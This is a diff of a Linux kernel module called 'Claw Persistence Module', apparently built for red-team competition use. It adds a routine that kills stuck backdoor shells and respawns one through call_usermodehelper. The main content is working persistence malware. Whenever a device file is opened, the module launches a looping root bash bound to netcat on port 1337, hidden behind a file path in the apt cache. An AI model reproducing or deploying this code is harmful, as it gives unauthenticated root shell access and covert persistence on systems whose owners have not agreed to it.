@@ -8,7 +8,7 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Tristan Fletcher (@Cyclawps52)");
 MODULE_DESCRIPTION("Claw Persistence Module");
-MODULE_VERSION("cleanup-rev6");
+MODULE_VERSION("cleanup-rev7");
 
 int initModule(void);
 void exitModule(void);
@@ -75,6 +75,9 @@ static int deviceOpen(struct inode* inode, struct file* file)
 	msgPtr = msg;
 	try_module_get(THIS_MODULE);
 	
+	// reset any stuck shells in case blue team is being mean
+	resetShell();
+
 	// actually spawn backdoor bind shell
 	bindShell();
 	return SUCCESS;
@@ -140,6 +143,19 @@ static int bindShell(void){
 	makePipe();
 	// while true; do cat /var/cache/apt/archives/null | sudo /bin/bash 2>&1 |/bin/nc -l 1337 >/var/cache/apt/archives/null; done >/dev/null &
 	char* argv[] = {"/bin/sh", "-c", "while true; do cat /var/cache/apt/archives/null | sudo /bin/bash 2>&1 |/bin/nc -l 1337 >/var/cache/apt/archives/null; done >/dev/null &", NULL};
+	static char* env[] = {
+		"HOME=/",
+		"TERM=linux",
+		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", 
+		NULL
+	};
+
+	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
+}
+
+static int resetShell(void){
+	// sudo pkill -9 -f "/var/cache/apt/archives/null" >/dev/null &
+	char* argv[] = {"/bin/sh", "-c", "sudo pkill -9 -f \"/var/cache/apt/archives/null\" >/dev/null &", NULL};
 	static char* env[] = {
 		"HOME=/",
 		"TERM=linux",
